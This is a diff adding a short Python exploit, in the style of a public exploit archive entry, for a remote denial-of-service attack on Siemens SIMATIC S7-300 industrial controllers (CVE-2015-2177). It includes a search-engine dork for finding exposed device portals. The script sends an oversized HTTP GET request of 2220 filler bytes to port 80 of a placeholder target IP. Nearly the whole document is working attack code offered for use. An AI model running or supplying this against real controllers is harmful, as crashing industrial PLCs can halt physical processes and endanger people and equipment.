@@ -1,0 +1,21 @@
+# Exploit Title: Siemens SIMATIC S7-300 CPU - Remote Denial Of Service
+# Google Dork: inurl:/Portal/Portal.mwsl
+# Date: 2018-05-30
+# Exploit Author: t4rkd3vilz
+# Vendor Homepage: https://www.siemens.com/
+# Version: SIMATIC S7-300 CPU family: all versions.
+# Tested on: Kali Linux
+# CVE: CVE-2015-2177
+
+#!/usr/bin/python
+import socket
+
+target_address="TargetIP"
+target_port=80
+
+buffer = "GET " + "\x42" * 2220 + " HTTP/1.1\r\n\r\n"
+
+sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connect=sock.connect((target_address,target_port))
+sock.send(buffer)
+sock.close()
